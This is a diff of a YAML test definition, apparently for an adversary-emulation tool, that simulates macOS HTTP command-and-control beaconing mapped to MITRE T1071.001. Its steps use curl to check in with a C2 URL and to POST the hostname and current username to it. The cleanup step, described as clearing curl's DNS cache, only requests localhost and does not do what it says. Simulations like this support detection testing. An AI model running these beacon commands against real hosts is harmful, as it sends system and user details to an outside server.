@@ -1,64 +1,50 @@
+---
 api_version: 2.0
-id: 003-http-beacon-simulation
+uuid: 0b7fe907-44d3-4db0-87f9-120c1f24ba13
 name: HTTP Beacon Simulation
-description: Simulates HTTP beacon communication with C2 server
-type: command_and_control
-
+authors:
+- Claude Code
+description: |
+  Simulates HTTP beacon communication with C2 server
+mitre:
+  tactics:
+  - TA0011 Command and Control
+  techniques:
+  - T1071 Application Layer Protocol
+  subtechniques:
+  - 'T1071.001 Application Layer Protocol: Web Protocols'
 requirements:
   platforms:
-    - os: darwin
-
+  - os: darwin
 args:
-  c2_url:
-    type: string
-    description: C2 server HTTP URL
-    default: "http://192.168.1.100:8080"
-  beacon_interval:
-    type: integer
-    description: Beacon check-in interval in seconds
-    default: 60
-  user_agent:
-    type: string
-    description: Custom user agent for HTTP requests
-    default: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
-  beacon_path:
-    type: string
-    description: Beacon endpoint path
-    default: "/api/checkin"
-
+- name: c2_url
+  description: C2 server HTTP URL
+  type: string
+  default: http://192.168.1.100:8080
+- name: beacon_interval
+  description: Beacon check-in interval in seconds
+  type: integer
+  default: 60
+- name: user_agent
+  description: Custom user agent for HTTP requests
+  type: string
+  default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+- name: beacon_path
+  description: Beacon endpoint path
+  type: string
+  default: /api/checkin
 steps:
-  - name: http_beacon_request
-    description: Send HTTP beacon request to C2
-    command: "curl -s -A \"{{ user_agent }}\" \"{{ c2_url }}{{ beacon_path }}\" -w \"\\nHTTP Status: %{http_code}\\n\""
-    type: command
-  
-  - name: beacon_with_data
-    description: Send beacon with system information
-    command: |
-      curl -s -A "{{ user_agent }}" -X POST "{{ c2_url }}{{ beacon_path }}" \
-        -d "hostname=$(hostname)&user=$(whoami)&timestamp=$(date +%s)" \
-        -w "\nHTTP Status: %{http_code}\n"
-    type: command
-    cleanup: true
-
-checks:
-  - name: verify_beacon_response
-    description: Verify C2 responds to beacon
-    condition: |
-      HTTP response code should be 200 or 404 (server acknowledgment)
-    type: output_validation
-
-test_type: dry_run
-
-cleanup:
-  - name: clear_curl_cache
-    description: Clear curl DNS cache
-    command: "curl -s http://localhost:9999 2>/dev/null || true"
-    type: command
-    optional: true
-
-metadata:
-  created: 2026-01-30
-  author: Claude Code
-  severity: medium
-  category: network_communication
+- name: http_beacon_request
+  description: Send HTTP beacon request to C2
+  inline: 'curl -s -A "{{ .Args.user_agent }}" "{{ .Args.c2_url }}{{ .Args.beacon_path }}" -w "\nHTTP Status: %{http_code}\n"'
+- name: beacon_with_data
+  description: Send beacon with system information
+  inline: |
+    curl -s -A "{{ .Args.user_agent }}" -X POST "{{ .Args.c2_url }}{{ .Args.beacon_path }}" \
+      -d "hostname=$(hostname)&user=$(whoami)&timestamp=$(date +%s)" \
+      -w "\nHTTP Status: %{http_code}\n"
+  cleanup:
+    inline: curl -s http://localhost:9999 2>/dev/null || true
+tests:
+- name: dry_run_test
+  dry_run: true
